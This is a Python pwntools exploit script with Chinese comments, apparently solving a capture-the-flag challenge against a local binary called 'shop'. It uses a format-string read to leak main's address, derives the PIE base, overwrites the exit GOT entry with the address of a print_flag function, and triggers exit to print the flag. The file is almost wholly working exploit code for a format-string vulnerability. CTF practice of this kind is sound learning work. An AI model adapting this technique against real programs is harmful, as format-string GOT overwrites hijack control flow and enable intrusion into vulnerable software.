#!/usr/bin/env python3
from pwn import *

# ===========================================================
#                      設定 & 連線
# ===========================================================
context(os='linux', arch='amd64', log_level='info')
exe = ELF("./shop")
io = process(exe.path)


gdb.attach(io, gdbscript='''

   # 在 exit 被呼叫前下斷點
   b *exit_program+14
   continue
''')
# ===========================================================
#               第一步: 洩漏一個執行中的位址
# ===========================================================
log.info("步驟 1: 洩漏 main 的絕對位址...")
leak_offset_in_stack = 47
payload_leak = f"%{leak_offset_in_stack}$p".encode()
io.sendlineafter(b'exit\n', payload_leak)
io.recvuntil(b'here is your choice\n')
leaked_addr_str = io.recvline().strip()
leaked_addr = int(leaked_addr_str, 16) # 這是 main在這次執行中的「絕對位址」
log.success(f"成功洩漏出 main 的位址: {hex(leaked_addr)}")


# ===========================================================
#               第二步: 手動進行位址計算
# ===========================================================
log.info("步驟 2: 進行手動位址計算...")

# 從 ELF 檔案中讀取固定的「相對偏移量」
offset_main = 0x1348
offset_print_flag = 0x1199 
offset_exit_got = 0x4030       

# 核心公式： PIE Base = 絕對位址 - 相對偏移量
pie_base = leaked_addr - offset_main
log.success(f"計算出的 PIE Base: {hex(pie_base)}")

# 根據 PIE Base 計算出我們需要的其他絕對位址
# 絕對位址 = PIE Base + 相對偏移量
target_addr_print_flag = pie_base + offset_print_flag
target_addr_exit_got = pie_base + offset_exit_got
log.info(f"計算出的 print_flag 絕對位址: {hex(target_addr_print_flag)}")
log.info(f"計算出的 exit@got 絕對位址: {hex(target_addr_exit_got)}")

# ===========================================================
#             第三步: 覆寫 GOT 表 & 觸發漏洞
# ===========================================================
log.info("步驟 3: 產生 payload 並覆寫 exit@got...")

# 使用我們手動算出來的位址來產生 payload
payload_overwrite = fmtstr_payload(8, {
    target_addr_exit_got: target_addr_print_flag
})
io.sendlineafter(b'exit\n', payload_overwrite)

log.info("步驟 4: 觸發被覆寫的函式...")
io.sendlineafter(b'exit\n', b'3')

log.success("攻擊觸發！應該能看到 Flag 了：")
io.interactive()